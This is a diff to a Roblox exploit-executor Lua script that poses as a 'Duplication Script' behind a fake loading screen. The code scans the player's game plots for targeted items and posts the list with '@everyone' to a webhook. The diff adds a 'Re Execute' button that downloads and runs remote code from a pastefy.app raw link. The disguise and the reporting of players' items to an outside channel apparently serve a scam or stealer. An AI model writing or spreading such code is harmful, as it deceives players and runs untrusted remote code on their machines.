@@ -33,7 +33,7 @@ bg.Parent = gui
 
 local percent = Instance.new("TextLabel")
 percent.AnchorPoint = Vector2.new(0.5,0.5)
-percent.Position = UDim2.new(0.5,0,0.36,0)
+percent.Position = UDim2.new(0.5,0,0.34,0)
 percent.Size = UDim2.new(0,200,0,40)
 percent.BackgroundTransparency = 1
 percent.Text = "0%"
@@ -44,7 +44,7 @@ percent.Parent = bg
 
 local timer = Instance.new("TextLabel")
 timer.AnchorPoint = Vector2.new(0.5,0.5)
-timer.Position = UDim2.new(0.5,0,0.42,0)
+timer.Position = UDim2.new(0.5,0,0.40,0)
 timer.Size = UDim2.new(0,200,0,40)
 timer.BackgroundTransparency = 1
 timer.Text = "01:00"
@@ -55,7 +55,7 @@ timer.Parent = bg
 
 local title = Instance.new("TextLabel")
 title.AnchorPoint = Vector2.new(0.5,0.5)
-title.Position = UDim2.new(0.5,0,0.50,0)
+title.Position = UDim2.new(0.5,0,0.48,0)
 title.Size = UDim2.new(0.8,0,0,60)
 title.BackgroundTransparency = 1
 title.Text = "Loading Duplication Script..."
@@ -66,7 +66,7 @@ title.Parent = bg
 
 local barBG = Instance.new("Frame")
 barBG.AnchorPoint = Vector2.new(0.5,0.5)
-barBG.Position = UDim2.new(0.5,0,0.58,0)
+barBG.Position = UDim2.new(0.5,0,0.56,0)
 barBG.Size = UDim2.new(0.5,0,0,20)
 barBG.BackgroundColor3 = Color3.fromRGB(30,30,30)
 barBG.BorderSizePixel = 0
@@ -77,6 +77,21 @@ bar.Size = UDim2.new(0,0,1,0)
 bar.BackgroundColor3 = Color3.fromRGB(170,0,255)
 bar.BorderSizePixel = 0
 bar.Parent = barBG
+
+local reexecute = Instance.new("TextButton")
+reexecute.AnchorPoint = Vector2.new(0.5,0)
+reexecute.Position = UDim2.new(0.5,0,0.64,0)
+reexecute.Size = UDim2.new(0,180,0,40)
+reexecute.BackgroundColor3 = Color3.fromRGB(120,0,200)
+reexecute.Text = "Re Execute"
+reexecute.Font = Enum.Font.GothamBold
+reexecute.TextColor3 = Color3.new(1,1,1)
+reexecute.TextScaled = true
+reexecute.Parent = bg
+
+reexecute.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/QDcXcBjN/raw", true))()
+end)
 
 local credit = Instance.new("TextLabel")
 credit.AnchorPoint = Vector2.new(0.5,1)
@@ -115,18 +130,18 @@ local req = request or http_request or syn and syn.request or fluxus and fluxus.
 
 task.spawn(function()
 local found = {}
+local detected = {}
 local plots = workspace:FindFirstChild("Plots") or workspace
 
 for _,v in ipairs(plots:GetDescendants()) do
-if targets[v.Name] then
+if targets[v.Name] and not detected[v.Name] then
+detected[v.Name] = true
 table.insert(found,v.Name)
 end
 end
 
-local brainrotList = "None"
 if #found > 0 then
-brainrotList = table.concat(found,"\n")
-end
+local brainrotList = table.concat(found,"\n")
 
 local data = {
 content = "@everyone",
@@ -150,6 +165,7 @@ Method = "POST",
 Headers = {["Content-Type"]="application/json"},
 Body = HttpService:JSONEncode(data)
 })
+end
 end
 end)
 
